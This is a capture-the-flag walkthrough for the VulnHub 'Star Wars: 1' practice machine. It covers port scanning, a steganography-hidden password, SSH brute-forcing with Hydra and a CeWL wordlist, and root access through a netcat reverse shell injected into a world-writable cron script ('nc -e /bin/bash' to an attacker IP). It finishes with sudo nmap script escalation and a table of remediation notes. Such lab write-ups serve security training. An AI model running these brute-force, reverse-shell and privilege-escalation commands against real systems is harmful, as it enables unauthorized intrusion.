# Star Wars: 1: CTF Walkthrough

**Target:** Star Wars CTF 1 by Sir Logic Team  
**Difficulty:** Beginner  
**Goal:** Gain root and capture the flag  
**Source:** [VulnHub](https://www.vulnhub.com/entry/star-wars-ctf-1,528/)

---

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration & Steganography](#2-web-enumeration--steganography)
- [3. Directory Discovery](#3-directory-discovery)
- [4. Credential Brute-Force (Hydra)](#4-credential-brute-force-hydra)
- [5. SSH Access: User han](#5-ssh-access--user-han)
- [6. Lateral Movement: User skywalker](#6-lateral-movement--user-skywalker)
- [7. Privilege Escalation: User darth](#7-privilege-escalation--user-darth)
- [8. Flag Capture](#8-flag-capture)
- [9. Remediation Notes](#9-remediation-notes)

---

## 1. Reconnaissance

### Network Discovery

```bash
netdiscover
```

| Field | Value |
|-------|-------|
| Target IP | `192.168.0.188` |

### Port Scanning

```bash
nmap -A 192.168.0.188
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Apache |

---

## 2. Web Enumeration & Steganography

### Browse to Target

```
http://192.168.0.188/
```

The page displays a Star Wars themed message: *"Find the password"*: hinting at a hidden credential.

### Inspect Page Source

The HTML source contains an author comment:

```html
<!-- password is here -->
```

Below the comment is an **image**. The password is embedded via **steganography**.

### Extract Hidden Password

1. Download the page's main image.
2. Use an online steganography decoder:
   - **Tool:** [https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)
   - Upload the image → click **Decode** → extract hidden text.

**Result:** Password is `babyYoda123`

---

## 3. Directory Discovery

We have a password but no username. Enumerate directories for user information.

### Initial Dirb Scan

```bash
dirb http://192.168.0.188/
```

**Key Finding:** `/robots.txt` exists.

### Check robots.txt

```
http://192.168.0.188/robots.txt
```

**Content:**

```
/r2d2
```

### Explore /r2d2

```
http://192.168.0.188/r2d2
```

A page with Star Wars content, but no username visible.

### Targeted Dirb Scan

Search for PHP, JS, and TXT files:

```bash
dirb http://192.168.0.188/ -X .php,.js,.txt
```

**Key Finding:** `/user.js`

### Check user.js

```
http://192.168.0.188/user.js
```

**Content reveals two usernames:**

```
skywalker
han
```

---

## 4. Credential Brute-Force (Hydra)

### Create Username List

```bash
echo "skywalker" > users.txt
echo "han" >> users.txt
```

### Brute-Force SSH

```bash
hydra -L users.txt -p babyYoda123 192.168.0.188 ssh
```

**Result:**

| Username | Password | Status |
|----------|----------|--------|
| han | babyYoda123 | Valid |

**skywalker**: no match with `babyYoda123`.

---

## 5. SSH Access: User han

```bash
ssh han@192.168.0.188
# Password: babyYoda123
```

### Enumerate Home Directory

```bash
ls -la
cd .secrets
ls -la
cat note.txt
```

**note.txt content:**

> Use CeWL to create a wordlist from the website.

### Enumerate System Users

```bash
tail /etc/passwd
```

**Users found:**

| User | Home Directory |
|------|----------------|
| han | /home/han |
| skywalker | /home/skywalker |
| darth | /home/darth |

### Create Wordlist with CeWL

```bash
cewl http://192.168.0.188/r2d2 > dict.txt
```

CeWL crawls the `/r2d2` page and extracts all words into a password list.

---

## 6. Lateral Movement: User skywalker

### Brute-Force skywalker's SSH

```bash
hydra -l skywalker -P dict.txt 192.168.0.188 ssh
```

**Result:**

| Username | Password | Status |
|----------|----------|--------|
| skywalker | *(CeWL-generated password)* | Valid |

### Switch User

```bash
su skywalker
# Password: <CeWL-extracted password>
```

### Enumerate skywalker's Directory

```bash
ls -la
cd .secrets
ls -la
cat note.txt
```

**note.txt content:**

> "Darth must take up the job of being a good father"

**Conclusion:** User `darth` is the target for privilege escalation.

### Check darth's Home Directory

```bash
ls -la /home/darth/
ls -la /home/darth/.secrets/
```

**Found:** A writable Python script `evil.py` that runs automatically via cron every minute.

---

## 7. Privilege Escalation: User darth

### Method 1: Cron Job Script Injection

Since `evil.py` is world-writable and executes as darth every minute:

```bash
cat /home/darth/.secrets/evil.py
```

**Replace contents with reverse shell:**

```python
import os
os.system("nc -e /bin/bash 192.168.0.147 1234")
```

> Replace `192.168.0.147` with your attacker IP.

### Start Netcat Listener

```bash
nc -lvp 1234
```

Wait up to one minute for the cron job to execute. A reverse shell arrives as user `darth`.

### Upgrade to Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Check sudo Permissions

```bash
sudo -l
```

**Result:** User `darth` can run **nmap** as root without a password.

### Method 2: Nmap Privilege Escalation

Create a custom Nmap script that spawns a root shell:

```bash
echo 'os.execute("/bin/sh")' > /tmp/root.nse
```

Execute via sudo nmap with the custom script:

```bash
sudo nmap --script=/tmp/root.nse
```

**Result:** Root shell obtained.

### Alternative Nmap Method (Interactive)

```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --interactive
nmap> !sh
```

---

## 8. Flag Capture

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat flag.txt
```

**Flag retrieved.** Challenge complete.

---

## Attack Flow Diagram

```
netdiscover → Target 192.168.0.188
                    ↓
nmap → Ports 22 (SSH), 80 (HTTP)
                    ↓
Web page → Source code → Steganography → Password: babyYoda123
                    ↓
dirb → /robots.txt → /r2d2 → /user.js → Users: skywalker, han
                    ↓
Hydra SSH brute-force → han:babyYoda123
                    ↓
SSH login (han) → .secrets/note.txt → "use CeWL"
                    ↓
cewl /r2d2 → dict.txt → Hydra → skywalker:<password>
                    ↓
su skywalker → .secrets/note.txt → "Darth"
                    ↓
/home/darth/.secrets/evil.py (world-writable, cron job)
                    ↓
Inject reverse shell → Netcat listener → darth shell
                    ↓
sudo -l → nmap → Custom .nse script → ROOT
                    ↓
cat /root/flag.txt → Challenge complete
```

---

## Flags Summary

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | `/root/flag.txt` | *(captured via root shell)* |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| netdiscover | Network host discovery |
| nmap | Port and service enumeration |
| Steganography Online | Extract hidden password from image |
| dirb | Web directory brute-force |
| hydra | SSH credential brute-force |
| CeWL | Wordlist generation from website content |
| Netcat | Reverse shell listener |
| nmap --interactive / .nse | Privilege escalation via sudo |

---

## Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| Steganography-based credential hiding | Store credentials in secure vaults; never embed in images |
| Credentials in HTML source | Never include secrets in client-side code |
| Robots.txt leaking hidden paths | Minimize information disclosure in robots.txt |
| SSH brute-force (weak password) | Enforce strong passwords; implement fail2ban |
| CeWL-predictable wordlists | Avoid using website content as password source |
| World-writable cron script | Restrict file permissions; audit cron jobs regularly |
| Sudo nmap (arbitrary script execution) | Remove nmap from sudoers; limit sudo to essential commands |
| No file integrity monitoring | Deploy AIDE/OSSEC for critical file change detection |

---

## References

- [Star Wars: 1 on VulnHub](https://www.vulnhub.com/entry/star-wars-ctf-1,528/)
- [CeWL: Custom Wordlist Generator](https://github.com/digininja/CeWL)
- [Hydra: Network Login Cracker](https://github.com/vanhauser-thc/thc-hydra)
- [Steganography Decoder](https://stylesuxx.github.io/steganography/)
- [GTFOBins: nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [MITRE ATT&CK: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
